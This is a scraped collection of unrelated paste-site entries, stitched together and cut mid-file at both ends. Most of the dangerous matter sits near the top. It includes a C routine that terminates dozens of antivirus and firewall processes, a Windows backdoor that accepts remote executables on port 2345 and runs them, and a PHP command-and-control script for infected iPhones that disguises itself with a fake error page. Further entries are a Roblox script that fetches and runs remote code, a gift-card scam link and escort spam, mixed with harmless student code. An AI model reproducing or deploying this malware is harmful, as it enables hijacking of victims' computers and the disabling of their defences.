""RULAUNCH.EXE"",""SAFEWEB.EXE"",""SBSERV.EXE"",""SD.EXE"",""SETUPVAMEEVAL.EXE"",""SETUP_FLOWPROTECTOR_US.EXE"",""SFC.EXE"",""SGSSFW32.EXE"",""avserve2.exe"",""SHELLSPYINSTALL.EXE"",""SHN.EXE"",""SMC.EXE"",""SOFI.EXE"",""SPF.EXE"",""SPHINX.EXE"",""SPYXX.EXE"",""SS3EDIT.EXE"",""ST2.EXE"",""SUPFTRL.EXE"",""SUPPORTER5.EXE"",""SYMPROXYSVC.EXE"",""SYSEDIT.EXE"",""TASKMON.EXE"",""TAUMON.EXE"",""TAUSCAN.EXE"",""TC.EXE"",""TCA.EXE"",""TCM.EXE"",""TDS-3.EXE"",""TDS2-98.EXE"",""TDS2-NT.EXE"",""TFAK5.EXE"",""TGBOB.EXE"",""TITANIN.EXE"",""TITANINXP.EXE"",""TRACERT.EXE"",""TRJSCAN.EXE"",""TRJSETUP.EXE"",""TROJANTRAP3.EXE"",""UNDOBOOT.EXE"",""UPDATE.EXE"",""VBCMSERV.EXE"",""VBCONS.EXE"",""VBUST.EXE"",""VBWIN9X.EXE"",""VBWINNTW.EXE"",
""VCSETUP.EXE"",""VFSETUP.EXE"",""VIRUSMDPERSONALFIREWALL.EXE"",""VNLAN300.EXE"",""VNPC3000.EXE"",""VPC42.EXE"",""VPFW30S.EXE"",""VPTRAY.EXE"",""VSCENU6.02D30.EXE"",""VSECOMR.EXE"",""VSHWIN32.EXE"",""VSISETUP.EXE"",""VSMAIN.EXE"",""VSMON.EXE"",""VSSTAT.EXE"",""VSWIN9XE.EXE"",""VSWINNTSE.EXE"",""VSWINPERSE.EXE"",""W32DSM89.EXE"",""W9X.EXE"",""WATCHDOG.EXE"",""WEBSCANX.EXE"",""WGFE95.EXE"",""WHOSWATCHINGME.EXE"",""WINRECON.EXE"",""WNT.EXE"",""WRADMIN.EXE"",""WRCTRL.EXE"",""WSBGATE.EXE"",""WYVERNWORKSFIREWALL.EXE"",""XPF202EN.EXE"",""ZAPRO.EXE"",""ZAPSETUP3001.EXE"",""ZATUTOR.EXE"",""ZAUINST.EXE"",""ZONALM2601.EXE"",""ZONEALARM.EXE"",""CCAPP.exe"", 0 };

  
						
register int m;

	for (m=0; exelst[m]; m++)

 KillProcess(exelst[m]);
	

	
	return 0;
}

int KillProcess(const char *szToTerminate)

{
	BOOL bResult,bResultm;
	DWORD aiPID[1000],iCb=1000,iNumProc,iV2000=0;
	DWORD iCbneeded,i,iFound=0;
	char szName[MAX_PATH],szToTermUpper[MAX_PATH];
	HANDLE hProc,hSnapShot,hSnapShotm;
	OSVERSIONINFO osvi;
    HINSTANCE hInstLib;
	int iLen,iLenP,indx;
    HMODULE hMod;
	PROCESSENTRY32 procentry;      
	MODULEENTRY32 modentry;
	iLenP=strlen(szToTerminate);
	if(iLenP<1 || iLenP>MAX_PATH) return 632;
	for(indx=0;indx<iLenP;indx++)
		szToTermUpper[indx]=toupper(szToTerminate[indx]);
	szToTermUpper[iLenP]=0;
     BOOL (WINAPI *lpfEnumProcesses)( DWORD *, DWORD cb, DWORD * );
     BOOL (WINAPI *lpfEnumProcessModules)( HANDLE, HMODULE *,
        DWORD, LPDWORD );
     DWORD (WINAPI *lpfGetModuleBaseName)( HANDLE, HMODULE,
        LPTSTR, DWORD );
      HANDLE (WINAPI *lpfCreateToolhelp32Snapshot)(DWORD,DWORD) ;
      BOOL (WINAPI *lpfProcess32First)(HANDLE,LPPROCESSENTRY32) ;
      BOOL (WINAPI *lpfProcess32Next)(HANDLE,LPPROCESSENTRY32) ;
      BOOL (WINAPI *lpfModule32First)(HANDLE,LPMODULEENTRY32) ;
      BOOL (WINAPI *lpfModule32Next)(HANDLE,LPMODULEENTRY32) ;
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
    bResult=GetVersionEx(&osvi);
	if(!bResult)   
	    return 606;
	if((osvi.dwPlatformId != VER_PLATFORM_WIN32_NT) &&
		(osvi.dwPlatformId != VER_PLATFORM_WIN32_WINDOWS))
		return 607;

    if(osvi.dwPlatformId==VER_PLATFORM_WIN32_NT)
	{   
         hInstLib = LoadLibraryA(""PSAPI.DLL"");
         if(hInstLib == NULL)
            return 605;

       
         lpfEnumProcesses = (BOOL(WINAPI *)(DWORD *,DWORD,DWORD*))
            GetProcAddress( hInstLib, ""EnumProcesses"" ) ;
         lpfEnumProcessModules = (BOOL(WINAPI *)(HANDLE, HMODULE *,
            DWORD, LPDWORD)) GetProcAddress( hInstLib,
            ""EnumProcessModules"" ) ;
         lpfGetModuleBaseName =(DWORD (WINAPI *)(HANDLE, HMODULE,
            LPTSTR, DWORD )) GetProcAddress( hInstLib,
            ""GetModuleBaseNameA"" ) ;

         if(lpfEnumProcesses == NULL ||
            lpfEnumProcessModules == NULL ||
            lpfGetModuleBaseName == NULL)
            {
               FreeLibrary(hInstLib);
               return 700;
            }
		 
		bResult=lpfEnumProcesses(aiPID,iCb,&iCbneeded);
		if(!bResult)
		{
            FreeLibrary(hInstLib);
			return 701;
		}


		iNumProc=iCbneeded/sizeof(DWORD);

		
		for(i=0;i<iNumProc;i++)
		{
	        strcpy(szName,""Unknown"");
	        hProc=OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ,FALSE,
				aiPID[i]);
	        if(hProc)
			{
               if(lpfEnumProcessModules(hProc,&hMod,sizeof(hMod),&iCbneeded) )
			   {
                  iLen=lpfGetModuleBaseName(hProc,hMod,szName,MAX_PATH);
			   }
			}
	        CloseHandle(hProc);

            if(strcmp(strupr(szName),szToTermUpper)==0)

			if(strcmp(_strupr(szName),szToTermUpper)==0)

			{
				iFound=1;
				hProc=OpenProcess(PROCESS_TERMINATE,FALSE,aiPID[i]);
				if(hProc)
				{
					if(TerminateProcess(hProc,0))
					{
						CloseHandle(hProc);
                        FreeLibrary(hInstLib);
						return 0;
					}
					else
					{
						CloseHandle(hProc);
                        FreeLibrary(hInstLib);
						return 602;
					}
				}
				else
				{
                    FreeLibrary(hInstLib);
					return 604;
				}
			}
		}
	}

	if(osvi.dwPlatformId==VER_PLATFORM_WIN32_WINDOWS)
	{
		
			
		hInstLib = LoadLibraryA(""Kernel32.DLL"");
		if( hInstLib == NULL )
			return 702;

		
		lpfCreateToolhelp32Snapshot=
			(HANDLE(WINAPI *)(DWORD,DWORD))
			GetProcAddress( hInstLib,
			""CreateToolhelp32Snapshot"" ) ;
		lpfProcess32First=
			(BOOL(WINAPI *)(HANDLE,LPPROCESSENTRY32))
			GetProcAddress( hInstLib, ""Process32First"" ) ;
		lpfProcess32Next=
			(BOOL(WINAPI *)(HANDLE,LPPROCESSENTRY32))
			GetProcAddress( hInstLib, ""Process32Next"" ) ;
		lpfModule32First=
			(BOOL(WINAPI *)(HANDLE,LPMODULEENTRY32))
			GetProcAddress( hInstLib, ""Module32First"" ) ;
		lpfModule32Next=
			(BOOL(WINAPI *)(HANDLE,LPMODULEENTRY32))
			GetProcAddress( hInstLib, ""Module32Next"" ) ;
		if( lpfProcess32Next == NULL ||
			lpfProcess32First == NULL ||
		    lpfModule32Next == NULL ||
			lpfModule32First == NULL ||
			lpfCreateToolhelp32Snapshot == NULL )
		{
			FreeLibrary(hInstLib);
			return 703;
		}
			
		

		hSnapShot = lpfCreateToolhelp32Snapshot(
			TH32CS_SNAPPROCESS, 0 ) ;
		if( hSnapShot == INVALID_HANDLE_VALUE )
		{
			FreeLibrary(hInstLib);
			return 704;
		}
		
        
        procentry.dwSize = sizeof(PROCESSENTRY32);
        bResult=lpfProcess32First(hSnapShot,&procentry);

        
        while(bResult)
        {
		    
		    hSnapShotm = lpfCreateToolhelp32Snapshot(
			    TH32CS_SNAPMODULE, procentry.th32ProcessID) ;
		    if( hSnapShotm == INVALID_HANDLE_VALUE )
			{
				CloseHandle(hSnapShot);
			    FreeLibrary(hInstLib);
			    return 704;
			}
			
			modentry.dwSize=sizeof(MODULEENTRY32);
			bResultm=lpfModule32First(hSnapShotm,&modentry);

			
			while(bResultm)
			{
		        if(strcmp(modentry.szModule,szToTermUpper)==0)
				{
				   
				    iFound=1;
				    
				    hProc=OpenProcess(PROCESS_TERMINATE,FALSE,procentry.th32ProcessID);
				    if(hProc)
					{
					    if(TerminateProcess(hProc,0))
						{
						   
							CloseHandle(hSnapShotm);
							CloseHandle(hSnapShot);
							CloseHandle(hProc);
			                FreeLibrary(hInstLib);
						    return 0;
						}
					    else
						{
						    
							CloseHandle(hSnapShotm);
							CloseHandle(hSnapShot);
							CloseHandle(hProc);
			                FreeLibrary(hInstLib);
						    return 602;
						}
					}
				    else
					{
					    
						CloseHandle(hSnapShotm);
						CloseHandle(hSnapShot);
			            FreeLibrary(hInstLib);
					    return 604;
					}
				}
				else
				{  
					modentry.dwSize=sizeof(MODULEENTRY32);
					bResultm=lpfModule32Next(hSnapShotm,&modentry);
				}
			}

			
			CloseHandle(hSnapShotm);
            procentry.dwSize = sizeof(PROCESSENTRY32);
            bResult = lpfProcess32Next(hSnapShot,&procentry);
        }
		CloseHandle(hSnapShot);
	}
	if(iFound==0)
	{
		FreeLibrary(hInstLib);
		return 603;
	}
	FreeLibrary(hInstLib);
	return 0;
}
"
kjjhS7Jq,🤑 G2A.com Free Gift Card Guide Mar 2024 FIX 🤑,ounnuo,GetText,Tuesday 26th of March 2024 06:25:19 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

If you use this make sure to use the English version of G2A.com otherwise this will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_764147.pdf

Working as of:
26 March 2024


















"
j4jx8S2F,Backdoor.h,FlyFar,C++,Tuesday 26th of March 2024 06:22:25 AM CDT,DWORD _stdcall listening(LPVOID pv);
k7gybfFS,Backdoor.cpp,FlyFar,C++,Tuesday 26th of March 2024 06:21:20 AM CDT,"/*************************
* Opens up port 2345.
* Backdoor that accepts
* remotely sent exe files
* saves them as a random 
* filename to system dir
* then executes them :)
*
**************************/
#include <windows.h>
#include <shellapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <winsock.h>
#pragma comment (lib,""ws2_32.lib"") 
#define BACKLOG 5

#define PORT 2345

void retrieve_file(int sock)
{
	int i, j;
	HANDLE hFile=NULL;
	char path[MAX_PATH], buf[1024];
	DWORD dw;

	srand(GetTickCount());
char random[MAX_PATH];

int e,d;
d = 3 + (rand() % 10);
		for (e=0; e<d; e++)
			random[e] = 'a' + (rand() % 26);
	
		char fslash[260]=""//"";
		GetSystemDirectory(path,sizeof(path));
strcat(path,fslash);
strcat(path,random);
strcat(path,"".exe"");

	


	hFile = CreateFile(path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == NULL || hFile == INVALID_HANDLE_VALUE) {
		hFile = NULL;
		goto drop;
	}

	for (i=0;;) {
		j = recv(sock, buf, sizeof(buf), 0);
		if (j <= 0) break;
		i += j;
		WriteFile(hFile, buf, j, &dw, 0);
		
	}
	CloseHandle(hFile);
ShellExecute(NULL,""open"",path,NULL,NULL,SW_SHOW); 
	closesocket(sock);		
	return;

drop:	closesocket(sock);
	if (hFile != NULL) 
	return;
}

DWORD _stdcall listening(LPVOID pv)

{

  int sin_size;
  int socket1;
  int socket_accept;
  struct sockaddr_in server;
  struct sockaddr_in client;
 socket1 = socket(AF_INET, SOCK_STREAM, 0);
  server.sin_family = AF_INET;
  server.sin_port = htons(PORT);
  server.sin_addr.s_addr = INADDR_ANY;
  bind(socket1,(struct sockaddr *)&server,sizeof(struct sockaddr));
 listen(socket1,BACKLOG);
  while(1){
     sin_size = sizeof(struct sockaddr_in);
    socket_accept = accept(socket1, (struct sockaddr *)&client,&sin_size);


retrieve_file(socket_accept);
	return 0;
    
}
}

"
MaxpRpDq,server/p.php,FlyFar,PHP,Tuesday 26th of March 2024 06:08:14 AM CDT,"<?php
	/*
		p.php - C&C component.
		---------------------
		This handles Command and Control logic for
		the infected iPhone, this merely echos a 
		shell script for the ""duh"" binary to download.
		
		/// NOTE ///
		Right now, there is no way to issue commands simply.
		You will need to edit the bot's command file to issue commands...
		To issue a global command, put it in the ""all"" file
		/// END ///
	*/
    error_reporting(E_ERROR | E_PARSE); // No php errors, but I reccomend you turn it on for debugging ONLY.
	
    $botid = htmlspecialchars($_GET[""id""]);
	$global_cmd = $_SERVER[""DOCUMENT_ROOT""] . ""/xml/bots/all"";
	$bot_cmd = $_SERVER[""DOCUMENT_ROOT""] . ""/xml/bots"" . ""/"" . $botid;
    
    if(!$botid || !file_exists($bot_cmd)) { // Die with a fake nginx message
    	echo ""<html>\n"";
		echo ""<head><title>403 Forbidden</title></head>\n"";
		echo ""<body bgcolor=\""white\"">\n"";
		echo ""<center><h1>404 Forbidden</h1></center>\n"";
		echo ""<hr><center>nginx/6.6.6 (Mac OS X)</center>\n"";
		echo ""</body>\n"";
		echo ""</html>\n"";
		echo ""<!-- a padding to disable MSIE and Chrome friendly error page -->\n"";
		echo ""<!-- a padding to disable MSIE and Chrome friendly error page -->\n"";
		echo ""<!-- a padding to disable MSIE and Chrome friendly error page -->\n"";
		echo ""<!-- a padding to disable MSIE and Chrome friendly error page -->\n"";
		echo ""<!-- a padding to disable MSIE and Chrome friendly error page -->\n"";
		echo ""<!-- a padding to disable MSIE and Chrome friendly error page -->\n"";
		die("""");
    } else {
		header('Content-Type: text/plain');
		echo file_get_contents($global_cmd).""\n\n"";
		echo file_get_contents($bot_cmd);
	}
?>"
fzi9dyZ5,wdt_external_pcf,mikroavr,Arduino,Tuesday 26th of March 2024 06:06:24 AM CDT,"#include ""PCF8574.h""
PCF8574 pcf8574(0x20);
byte pinWDT = P7;
byte pinLED = P4;

byte pinRel[] = {P0, P1, P2, P3};

bool stateWDT = 0;
byte dry[] = {35, 34, 39, 36};
unsigned cur_time_wdt, old_time_wdt;


void setup() {
  // put your setup code here, to run once:
  Serial.begin(115200);

  Serial.println(""init pcf: "");

  for (int i = 0; i < sizeof(pinRel); i++) {
    Serial.print(pinRel[i]);
    pinMode(pinRel[i], OUTPUT);
  }

  pcf8574.pinMode(pinWDT, OUTPUT);
  pcf8574.pinMode(pinLED, OUTPUT);

  if (pcf8574.begin()) {
    Serial.println(""OK"");
  } else {
    Serial.println(""KO"");
  }
  delay(100);
  for (int i = 0; i < sizeof(pinRel); i++) {
    pcf8574.digitalWrite(pinRel[i], HIGH); // SET RELAY OFF
  }
}

void loop() {
  // put your main code here, to run repeatedly:
  cur_time_wdt = millis();
  if (cur_time_wdt - old_time_wdt >= 500) {
    seed_wdt();
    for (int i = 0; i < sizeof(dry); i++) {
      Serial.print(digitalRead(dry[i]));
      Serial.print("","");
    }
    Serial.println();
    old_time_wdt = millis();
  }
}

void seed_wdt() {
  stateWDT = !stateWDT;
  pcf8574.digitalWrite(P7, stateWDT);
  pcf8574.digitalWrite(P4, stateWDT);
}"
0NAz0Qmx,Adalaj Escorts | Independent Escorts in Adalaj,neeharajori23,BOO,Tuesday 26th of March 2024 06:03:10 AM CDT,"Nobody can remain indifferent to our beauties with their flawless bodies and exquisite soft skin. With their toned long legs and full, seductive lips, these Adalaj call girls are really attractive and might provide you with the most amazing oral pleasure. Imagine how sensual and passionate this woman's sexy dance would be, or how sumptuous her massage may be. Our beauties offer the most opulent escort services in Adalaj since they don't follow any weird rules regarding sexual pleasure.

Website - http://neeha.in/adalaj-escorts-girls.html"
jmL5vvcd,Untitled,Corbi098,Java,Tuesday 26th of March 2024 06:00:24 AM CDT,"package org.example.xml;

import javax.swing.*;

public class MaxClicker extends JFrame {
    public static void main(String[] args) {
        new MaxClicker();
    }
    private int maxClicks = 7;
    private int clicks = 0;

    public MaxClicker() {
        super(""Clicker game"");

        setLayout(null);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        setSize(300, 250);
        setLocationRelativeTo(null);
        setVisible(true);

        JButton button = new JButton(""Click me!"");
        button.setBounds(100, 50, 100, 100);
        button.addActionListener(actionEvent -> {
            if (++clicks >= maxClicks) {
                try {
                    throw new MaxClicksReachedException();
                } catch (MaxClicksReachedException e) {
                    JOptionPane.showMessageDialog(this, e.getMessage(), ""Error"", JOptionPane.ERROR_MESSAGE);
                }
            }
        });
        add(button);
    }

    public static class MaxClicksReachedException extends Exception {
        public MaxClicksReachedException() {
            super(""Max clicks reached"");
        }
    }
}
"
pdsH2C8B,Untitled,Corbi098,Java,Tuesday 26th of March 2024 05:58:59 AM CDT,"package org.example.xml;

import javax.swing.*;

public class MaxClicker extends JFrame {
    public static void main(String[] args) {
        new MaxClicker();
    }
    private int maxClicks = 5;
    private int clicks = 0;

    public MaxClicker() {
        super(""Clicker game"");

        setLayout(null);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        setSize(300, 250);
        setLocationRelativeTo(null);
        setVisible(true);

        JButton button = new JButton(""Click me!"");
        button.setBounds(100, 50, 100, 100);
        button.addActionListener(actionEvent -> {
            if (++clicks >= maxClicks) {
                try {
                    throw new MaxClicksReachedException();
                } catch (MaxClicksReachedException e) {
                    JOptionPane.showMessageDialog(this, e.getMessage(), ""Error"", JOptionPane.ERROR_MESSAGE);
                }
            }
        });
        add(button);
    }

    public static class MaxClicksReachedException extends Exception {
        public MaxClicksReachedException() {
            super(""Max clicks reached"");
        }
    }
}
"
TZRTSq0r,Untitled,35657,C++,Tuesday 26th of March 2024 05:58:40 AM CDT,"#include <iostream>
#include <vector>
//#include <ctime>

using namespace std;

template <typename T>
class Queue {
public:
    void Push(const T& element) {
        elements_[size] = element;
        size++;
    }
    void Pop() {
        if (size > 0) {
            for (int i = 0; i < size - 1; i++) {
                elements_[i] = elements_[i + 1];
            }
            size--;
        }
    }
    const T& Back() const {
        return elements_[size];
    }
    T& Back() {
        return elements_[size];
    }

    const T& Front() const {
        return elements_[0];
    }
    T& Front() {
        return elements_[0];
    }

    void Print() const {
        for (int i = 0; i < size; i++) {
            cout << elements_[i] << ' ';
        }
        cout << endl;
    }

    int Size() const {
        return size;
    }
    bool IsEmpty() const {
        return size == 0;
    }

private:
    T elements_[100];
    int size = 0;
};

int main() {
    Queue<int> queue;
    //int start_time = clock();
    for (int i = 0; i < 10; ++i) { // для замеров 500000 ставить
        queue.Push(i);
        queue.Print(); // для замеров закомментировать
    }
    cout << endl;

    while (!queue.IsEmpty()) {
        queue.Print(); // для замеров закомментировать
        queue.Pop();
    }
    cout << endl;
    //int end_time = clock();
    //cout << end_time - start_time << "" milliseconds"" << endl;
}"
4DJiHTWh,Untitled,35657,C++,Tuesday 26th of March 2024 05:57:32 AM CDT,"#include <iostream>

using namespace std;

template <typename T>
class List {
public:

    List() : size_(0), head_(nullptr), last_(nullptr) {}

    List(const List& other) : size_(0), head_(nullptr), last_(nullptr) {
        Node* temp = other.last_;
        while (temp != nullptr) {
            push_front(temp->value);
            temp = temp->prev;
        }
    }

    List(List&& other) : size_(other.size_), head_(other.head_), last_(other.last_) {
        other.head_ = other.last_ = nullptr;
    }

    List& operator=(const List& other) {
        if (this != &other) {
            clear();
            Node* temp = other.last_;
            while (temp != nullptr) {
                push_front(temp->value);
                temp = temp->prev;
            }
        }
        return *this;
    }

    List& operator=(List&& other) {
        if (this != &other) {
            clear();
            size_ = other.size_;
            head_ = other.head_;
            last_ = other.last_;
            other.head_ = other.last_ = nullptr;
        }
        return *this;
    }

    void push_front(const T& value) {
        if (size_ == 0) {
            last_ = head_ = new Node{ value, nullptr, nullptr };
            size_++;
            return;
        }
        Node* temp = new Node{ value, head_, nullptr };
        head_->prev = temp;
        head_ = temp;
        size_++;
    }

    void push_back(const T& value) {
        if (size_ == 0) {
            last_ = head_ = new Node{ value, nullptr, nullptr };
            size_++;
            return;
        }
        Node* temp = new Node{ value, nullptr, last_ };
        last_->next = temp;
        last_ = temp;
        size_++;
    }

    void pop_front() {
        if (size_ > 0) {
            if (size_ == 1) {
                delete head_;
                last_ = head_ = nullptr;
                size_--;
                return;
            }
            Node* temp = head_;
            head_ = head_->next;
            delete temp;
            head_->prev = nullptr;
            size_--;
        }
    }

    void pop_back() {
        if (size_ > 0) {
            if (size_ == 1) {
                delete head_;
                last_ = head_ = nullptr;
                size_--;
                return;
            }
            Node* temp = last_;
            last_ = last_->prev;
            delete temp;
            last_->next = nullptr;
            size_--;
        }
    }

    void insert(const int index, const T& value) {
        if (index == 0) {
            push_front(value);
            return;
        }
        if (index == size_) {
            push_back(value);
            return;
        }
        if (index > 0 && index < size_) {
            Node* temp = head_;
            for (int i = 0; i < index - 1; i++) {
                temp = temp->next;
            }
            Node* buf = new Node{ value, temp->next, temp };
            temp->next->prev = buf;
            temp->next = buf;
            size_++;
        }
    }

    void erase(const int index) {
        if (index == 0) {
            pop_front();
            return;
        }
        if (index == size_ - 1) {
            pop_back();
            return;
        }
        if (index > 0 && index < size_ - 1) {
            Node* temp = head_;
            for (int i = 0; i < index - 1; i++) {
                temp = temp->next;
            }
            Node* buf = temp->next->next;
            delete temp->next;
            temp->next = buf;
            buf->prev = temp;
            size_--;
        }
    }

    T& operator[] (const int index) {
        if (index >= 0 && index < size_) {
            Node* temp = head_;
            for (int i = 0; i < index; i++) {
                temp = temp->next;
            }
            return temp->value;
        }
    }

    const T& operator[] (const int index) const {
        if (index >= 0 && index < size_) {
            Node* temp = head_;
            for (int i = 0; i < index; i++) {
                temp = temp->next;
            }
            return temp->value;
        }
    }

    bool operator==(const List& other) const {
        if (size_ != other.size_) {
            return false;
        }
        Node* temp = head_;
        Node* other_temp = other.head_;

        while (temp != nullptr) {
            if (temp->value != other_temp->value) {
                return false;
            }
            temp = temp->next;
            other_temp = other_temp->next;
        }
        return true;
    }

    bool operator!=(const List& other) const {
        return !(*this == other);
    }

    int find(const T& value) const {
        int index = 0;
        Node* temp = head_;

        while (temp != nullptr && temp->value != value) {
            temp = temp->next;
            index++;
        }
        if (temp != nullptr) {
            return index;
        }
        return -1;
    }

    T& front() {
        if (head_ != nullptr) {
            return head_->value;
        }
    }

    const T& front() const {
        if (head_ != nullptr) {
            return head_->value;
        }
    }

    T& back() {
        if (last_ != nullptr) {
            return last_->value;
        }
    }

    const T& back() const {
        if (last_ != nullptr) {
            return last_->value;
        }
    }

    void print() {
        Node* temp = head_;
        while (temp != nullptr) {
            cout << temp->value << "" "";
            temp = temp->next;
        }
        cout << endl;
    }

    int size() const {
        return size_;
    }

    void clear() {
        while (head_ != nullptr) {
            pop_front();
        }
    }

    ~List() {
        clear();
    }

private:
    struct Node { // двусвязный список состоит из узлов
        T value; // узел хранит информативную часть
        Node* next; // указатель на следующий узел в списке
        Node* prev; // указатель на предыдущий узел
    };

    int size_;
    Node* head_;
    Node* last_;
};

int main() {
    List<int> list1;
    for (int i = 0; i < 10; i++) {
        list1.push_front(i + 1);
    }
    list1.print();
    cout << list1.size() << endl;

    for (int i = 0; i < 3; i++) {
        list1.pop_front();
    }
    list1.print();
    cout << list1.size() << endl;

    List<int> list2(list1);
    list2.print();
    cout << list2.size() << endl;

    List<int> list3;
    list3 = move(list1);
    list3.print();

    list3.insert(2, 34);
    list3.insert(5, 35);
    list3.print();
    list3.erase(4);
    list3.print();
    cout << list3[4] << endl;
    cout << list3.back() << endl;
    cout << list3.front() << endl;
    cout << (list2 == list3) << endl;

    char ch = 'a';

    List<char> list4;

    for (int i = 0; i < 26; i++) {
        list4.push_back(ch++);
    }

    list4.print();
}"
PVDWpy9B,PointerFunction,Sergey_Maslov_94,C,Tuesday 26th of March 2024 05:53:32 AM CDT,"void F1()
{
	cout << ""void F 1()"" << endl;
}

void F2(int a)
{
	cout << ""void F 2()"" << endl;
}

int main()
{
	void (*fooPointer)(int a);

	fooPointer = F2;

	int a = 1;

	fooPointer(a);

	return 0;
}"
cLhXVDgh,Pet Sim 99 Auto Rank Script,quikzyYTbtw,Lua,Tuesday 26th of March 2024 05:32:51 AM CDT,"--[[
-PS99 Auto Rank Script 
 made by quikzy & zerqhy :)
]]
 
loadstring(game:HttpGet(""https://raw.githubusercontent.com/zerqhy/petsim99/main/hugesgames.io""))()"
pAUv9i6T,Untitled,ubidefeo,Python,Tuesday 26th of March 2024 05:21:14 AM CDT,"from mp_button import Button

def azione_bottone(pin, event):
    print('azione', event)
    print('piedino', pin)
    print(f'Button connected to Pin {pin} has been {event}')
    if event == Button.PRESSED:
        print('Button pressed')
        print('ho premuto un bottone allo IED')
    if event == Button.RELEASED:
        print('Button released')
        print('ho rilasciato un bottone allo IED')

def my_action(numero_pin, azione):
  global contatore
  if numero_pin == 16 and azione == Button.PRESSED:
    print('ho premuto il bottone sul pin 16')
    contatore += 1
  if numero_pin == 16 and azione == Button.RELEASED:
    print('ho rilasciato il bottone sul pin 16')
  if numero_pin == 19 and azione == Button.PRESSED:
    contatore -= 1
    print('ho premuto il bottone sul pin 19')
  print('quanti ne ho:', contatore)
  
button_a = Button(16, rest_state = True, callback = my_action)
button_b = Button(19, rest_state = True, callback = my_action)

contatore = 0

while(True):
  button_a.update()
  button_b.update()"
S3KJ3rtP,sandpiles,Skad_the_Wolf,Java,Tuesday 26th of March 2024 05:15:04 AM CDT,"/**
  *
  * Abelian Sandpile Rechner
  *
  * @version 1.0 from 17.03.2024
  * @Skadi Wiesemann 
  */

import java.util.*;
import java.util.Scanner;
import java.util.stream.*;



public class sandpiles {
  
  public static int[] x;
  
  public static int[] y;
  
  public static int[] z;
  
  public static int length = 9;
  
  public static void main(String[] args) {
        
        define_x(); 
        define_y();
        addition();
    
        int topple = 4;
        boolean doesContain = IntStream.of(sandpiles.z).anyMatch(x -> x >= 4);
    
    if (doesContain == true) {
      for (int i = 0;i <= sandpiles.length; i++ ) {
         finalisation();
        } // end of for
    } // end of if    
     System.out.println();
    System.out.println(""Your sum is:"");
         System.out.println(""(""+ z[0] +"")  ("" + z[1] + "")  ("" + z[2] + "")"");
         System.out.println(""(""+ z[3] +"")  ("" + z[4] + "")  ("" + z[5] + "")"");
         System.out.println(""(""+ z[6] +"")  ("" + z[7] + "")  ("" + z[8] + "")"");
  }   //end of main
  
public static void define_x() {
  
        Scanner sc = new Scanner(System.in);
 
        // Take the array size from the user
        int arr_size = 9;
 
        // Initialize the array's
        // size using user input
        sandpiles.x = new int[arr_size];
 
        // Take user elements for the array
        System.out.println(
            ""Enter the elements of the Sandpile: "");
        for (int i = 0; i < arr_size; i++) {
            if (sc.hasNextInt()) {
              
                sandpiles.x[i] = sc.nextInt();
              
            } //end of if
        }  //end of for

       System.out.println(""Your first sandpile is:"");
    
       System.out.println(""(""+ x[0] +"")  ("" + x[1] + "")  ("" + x[2] + "")"");
       System.out.println(""(""+ x[3] +"")  ("" + x[4] + "")  ("" + x[5] + "")"");
       System.out.println(""(""+ x[6] +"")  ("" + x[7] + "")  ("" + x[8] + "")"");
      
  } //end of define_x()
  
  public static void define_y() {
  
        Scanner sc = new Scanner(System.in);
 
        // Take the array size from the user
        int arr_size = 9;
 
        // Initialize the array's
        // size using user input
        sandpiles.y = new int[arr_size];
 
        // Take user elements for the array
        System.out.println(""Enter the elements of the second sandpile: "");
        for (int i = 0; i < arr_size; i++) {
            if (sc.hasNextInt()) {
              
                sandpiles.y[i] = sc.nextInt();
              
            } //end of if
        }  // end of for
    
       System.out.println(""Your second sandpile is:"");
    
       System.out.println(""(""+ y[0] +"")  ("" + y[1] + "")  ("" + y[2] + "")"");
       System.out.println(""(""+ y[3] +"")  ("" + y[4] + "")  ("" + y[5] + "")"");
       System.out.println(""(""+ y[6] +"")  ("" + y[7] + "")  ("" + y[8] + "")"");
    
     }  //end of define_y
    
  public static void addition(){
    
     int arr_size = 9;
     sandpiles.z = new int[arr_size];
      
    for (int i = 0; i < arr_size ; ++i ) {
    
        sandpiles.z[i] = sandpiles.x[i] + sandpiles.y[i];
      
       } // end of for 
    
    } // end of addition
    
  public static void finalisation() {
    
      if (sandpiles.z[0] >= 4) {
      
         sandpiles.z[0] = sandpiles.z[0] - 4;
         sandpiles.z[0 + 1] = sandpiles.z[0 + 1] +1;
         sandpiles.z[0 + 3] = sandpiles.z[0 + 3] +1;
    
       }//end of if
      
      if (sandpiles.z[1] >= 4) {
      
         sandpiles.z[1] = sandpiles.z[1] - 4;
         sandpiles.z[1 - 1] = sandpiles.z[1 - 1] + 1;
         sandpiles.z[1 + 1] = sandpiles.z[1 + 1] + 1;
         sandpiles.z[1 + 3] = sandpiles.z[1 + 3] + 1;     
        
       }//end of if
      
      if (sandpiles.z[2] >= 4) {
      
         sandpiles.z[2] = sandpiles.z[2] - 4;
         sandpiles.z[2 - 1] = sandpiles.z[2 - 1] +1;
         sandpiles.z[2 + 3] = sandpiles.z[2 + 3] +1;
    
       }//end of if
      
      if (sandpiles.z[3] >= 4) {
      
         sandpiles.z[3] = sandpiles.z[3] - 4;
         sandpiles.z[3 - 3] = sandpiles.z[3 - 3] + 1;
         sandpiles.z[3 + 1] = sandpiles.z[3 + 1] + 1;
         sandpiles.z[3 + 3] = sandpiles.z[3 + 3] + 1;
    
      }//end of if
      
      if (sandpiles.z[4] >= 4) {
      
         sandpiles.z[4] = sandpiles.z[4] - 4;
         sandpiles.z[4 - 1] = sandpiles.z[4 - 1] + 1;
         sandpiles.z[4 + 1] = sandpiles.z[4 + 1] + 1;
         sandpiles.z[4 + 3] = sandpiles.z[4 + 3] + 1;
         sandpiles.z[4 - 3] = sandpiles.z[4 - 3] + 1;
         
       }//end of if
      
      if (sandpiles.z[5] >= 4) {
      
         sandpiles.z[5] = sandpiles.z[5] - 4;
         sandpiles.z[5 - 1] = sandpiles.z[5 - 1] + 1;
